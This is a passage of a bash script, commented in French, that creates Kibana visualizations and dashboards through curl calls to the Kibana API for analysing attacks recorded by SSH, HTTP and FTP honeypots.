         "visState": "{\"title\":\"💻 Top Commandes SSH Malveillantes\",\"type\":\"table\",\"params\":{\"perPage\":15,\"showPartialRows\":false,\"showMeticsAtAllLevels\":false,\"sort\":{\"columnIndex\":null,\"direction\":null},\"showTotal\":false,\"totalFunc\":\"sum\"},\"aggs\":[{\"id\":\"1\",\"enabled\":true,\"type\":\"count\",\"schema\":\"metric\",\"params\":{}},{\"id\":\"2\",\"enabled\":true,\"type\":\"terms\",\"schema\":\"bucket\",\"params\":{\"field\":\"input.keyword\",\"size\":20,\"order\":\"desc\",\"orderBy\":\"1\",\"otherBucket\":false,\"otherBucketLabel\":\"Other\",\"missingBucket\":false,\"missingBucketLabel\":\"Missing\"}}]}",
         "uiStateJSON": "{}",
         "description": "Commandes les plus exécutées dans le honeypot SSH",
         "version": 1,
         "kibanaSavedObjectMeta": {
           "searchSourceJSON": "{\"index\":\"honeypot-ssh\",\"query\":{\"bool\":{\"must\":[{\"exists\":{\"field\":\"input\"}}]}},\"filter\":[]}"
         }
       }
     }' >/dev/null 2>&1

# 7. CARTE GÉOGRAPHIQUE DES ATTAQUES
print_status "  Création: Carte géographique des attaques..."
curl -X POST "$KIBANA_URL/api/saved_objects/visualization" \
     -H "Content-Type: application/json" \
     -H "kbn-xsrf: true" \
     -d '{
       "attributes": {
         "title": "🗺️ Carte Géographique des Attaques",
         "visState": "{\"title\":\"🗺️ Carte Géographique des Attaques\",\"type\":\"tile_map\",\"params\":{\"colorSchema\":\"Yellow to Red\",\"mapType\":\"Scaled Circle Markers\",\"isDesaturated\":true,\"addTooltip\":true,\"heatClusterSize\":1.5,\"legendPosition\":\"bottomright\",\"mapZoom\":2,\"mapCenter\":[0,0],\"wms\":{\"enabled\":false,\"url\":\"https://basemap.nationalmap.gov/arcgis/services/USGSTopo/MapServer/WMSServer\",\"options\":{\"version\":\"1.3.0\",\"layers\":\"0\",\"format\":\"image/png\",\"transparent\":true,\"attribution\":\"Maps provided by USGS\",\"styles\":\"\"}}},\"aggs\":[{\"id\":\"1\",\"enabled\":true,\"type\":\"count\",\"schema\":\"metric\",\"params\":{}},{\"id\":\"2\",\"enabled\":true,\"type\":\"geohash_grid\",\"schema\":\"segment\",\"params\":{\"field\":\"geoip.location\",\"autoPrecision\":true,\"precision\":2}}]}",
         "uiStateJSON": "{\"mapZoom\":2,\"mapCenter\":[0,0]}",
         "description": "Visualisation géographique des sources d'attaques",
         "version": 1,
         "kibanaSavedObjectMeta": {
           "searchSourceJSON": "{\"index\":\"honeypot-all\",\"query\":{\"bool\":{\"must\":[{\"exists\":{\"field\":\"geoip.location\"}}]}},\"filter\":[]}"
         }
       }
     }' >/dev/null 2>&1

# 8. TYPES D'ATTAQUES HTTP
print_status "  Création: Types d'attaques HTTP..."
curl -X POST "$KIBANA_URL/api/saved_objects/visualization" \
     -H "Content-Type: application/json" \
     -H "kbn-xsrf: true" \
     -d '{
       "attributes": {
         "title": "🌐 Types d'Attaques HTTP Détectées",
         "visState": "{\"title\":\"🌐 Types d'Attaques HTTP Détectées\",\"type\":\"histogram\",\"params\":{\"grid\":{\"categoryLines\":false,\"style\":{\"color\":\"#eee\"}},\"categoryAxes\":[{\"id\":\"CategoryAxis-1\",\"type\":\"category\",\"position\":\"bottom\",\"show\":true,\"style\":{},\"scale\":{\"type\":\"linear\"},\"labels\":{\"show\":true,\"truncate\":100},\"title\":{}}],\"valueAxes\":[{\"id\":\"ValueAxis-1\",\"name\":\"LeftAxis-1\",\"type\":\"value\",\"position\":\"left\",\"show\":true,\"style\":{},\"scale\":{\"type\":\"linear\",\"mode\":\"normal\"},\"labels\":{\"show\":true,\"rotate\":0,\"filter\":false,\"truncate\":100},\"title\":{\"text\":\"Count\"}}],\"seriesParams\":[{\"show\":\"true\",\"type\":\"histogram\",\"mode\":\"stacked\",\"data\":{\"label\":\"Count\",\"id\":\"1\"},\"valueAxis\":\"ValueAxis-1\",\"drawLinesBetweenPoints\":true,\"showCircles\":true}],\"addTooltip\":true,\"addLegend\":true,\"legendPosition\":\"right\",\"times\":[],\"addTimeMarker\":false},\"aggs\":[{\"id\":\"1\",\"enabled\":true,\"type\":\"count\",\"schema\":\"metric\",\"params\":{}},{\"id\":\"2\",\"enabled\":true,\"type\":\"terms\",\"schema\":\"segment\",\"params\":{\"field\":\"attack_type.keyword\",\"size\":10,\"order\":\"desc\",\"orderBy\":\"1\",\"otherBucket\":false,\"otherBucketLabel\":\"Other\",\"missingBucket\":false,\"missingBucketLabel\":\"Missing\"}}]}",
         "uiStateJSON": "{}",
         "description": "Distribution des types d'attaques HTTP (SQL injection, XSS, etc.)",
         "version": 1,
         "kibanaSavedObjectMeta": {
           "searchSourceJSON": "{\"index\":\"honeypot-http\",\"query\":{\"bool\":{\"must\":[{\"exists\":{\"field\":\"attack_type\"}}]}},\"filter\":[]}"
         }
       }
     }' >/dev/null 2>&1

print_success "✓ 8 visualisations créées"

# ==============================================================================
# ÉTAPE 4 : CRÉATION DES DASHBOARDS
# ==============================================================================

print_section "4. CRÉATION DES DASHBOARDS"

print_status "Création des dashboards principaux..."

# Attendre que les visualisations soient traitées
sleep 3

# Dashboard principal - Vue d'ensemble
print_status "  Création: Dashboard principal - Vue d'ensemble..."
curl -X POST "$KIBANA_URL/api/saved_objects/dashboard" \
     -H "Content-Type: application/json" \
     -H "kbn-xsrf: true" \
     -d '{
       "attributes": {
         "title": "🎯 Honeypot Security Dashboard - Vue d'\''Ensemble",
         "hits": 0,
         "description": "Dashboard principal pour l'\''analyse des attaques honeypot - Vue globale SSH, HTTP, FTP",
         "panelsJSON": "[]",
         "optionsJSON": "{\"useMargins\":true,\"syncColors\":false,\"hidePanelTitles\":false}",
         "version": 1,
         "timeRestore": false,
         "timeTo": "now",
         "timeFrom": "now-24h",
         "refreshInterval": {
           "pause": false,
           "value": 30000
         },
         "kibanaSavedObjectMeta": {
           "searchSourceJSON": "{\"query\":{\"match_all\":{}},\"filter\":[]}"
         }
       }
     }' >/dev/null 2>&1

# Dashboard SSH spécialisé
print_status "  Création: Dashboard SSH spécialisé..."
curl -X POST "$KIBANA_URL/api/saved_objects/dashboard" \
     -H "Content-Type: application/json" \
     -H "kbn-xsrf: true" \
     -d '{
       "attributes": {
         "title": "🔐 SSH Honeypot Analysis Dashboard",
         "hits": 0,
         "description": "Analyse détaillée des attaques SSH - Cowrie honeypot",
         "panelsJSON": "[]",
         "optionsJSON": "{\"useMargins\":true,\"syncColors\":false,\"hidePanelTitles\":false}",
         "version": 1,
         "timeRestore": false,
         "timeTo": "now",
         "timeFrom": "now-7d",
         "refreshInterval": {
           "pause": false,
           "value": 60000
         },
         "kibanaSavedObjectMeta": {
           "searchSourceJSON": "{\"query\":{\"bool\":{\"must\":[{\"term\":{\"honeypot_type\":\"ssh\"}}]}},\"filter\":[]}"
         }
       }
     }' >/dev/null 2>&1

# Dashboard HTTP spécialisé
print_status "  Création: Dashboard HTTP spécialisé..."
curl -X POST "$KIBANA_URL/api/saved_objects/dashboard" \
     -H "Content-Type: application/json" \
     -H "kbn-xsrf: true" \
     -d '{
       "attributes": {
         "title": "🌐 HTTP Honeypot Analysis Dashboard",
         "hits": 0,
         "description": "Analyse détaillée des attaques HTTP - Web honeypot",
         "panelsJSON": "[]",
         "optionsJSON": "{\"useMargins\":true,\"syncColors\":false,\"hidePanelTitles\":false}",
         "version": 1,
         "timeRestore": false,
         "timeTo": "now",
         "timeFrom": "now-7d",
         "refreshInterval": {
           "pause": false,
           "value": 60000
         },
         "kibanaSavedObjectMeta": {
           "searchSourceJSON": "{\"query\":{\"bool\":{\"must\":[{\"term\":{\"honeypot_type\":\"http\"}}]}},\"filter\":[]}"
         }
       }
     }' >/dev/null 2>&1

# Dashboard temps réel
print_status "  Création: Dashboard temps réel..."
curl -X POST "$KIBANA_URL/api/saved_objects/dashboard" \
     -H "Content-Type: application/json" \
     -H "kbn-xsrf: true" \
     -d '{
       "attributes": {
         "title": "⚡ Real-Time Attack Monitoring",
         "hits": 0,
         "description": "Monitoring en temps réel des attaques - Toutes sources",
         "panelsJSON": "[]",
         "optionsJSON": "{\"useMargins\":true,\"syncColors\":false,\"hidePanelTitles\":false}",
         "version": 1,
         "timeRestore": false,
         "timeTo": "now",
         "timeFrom": "now-15m",
         "refreshInterval": {
           "pause": false,
           "value": 10000
         },
         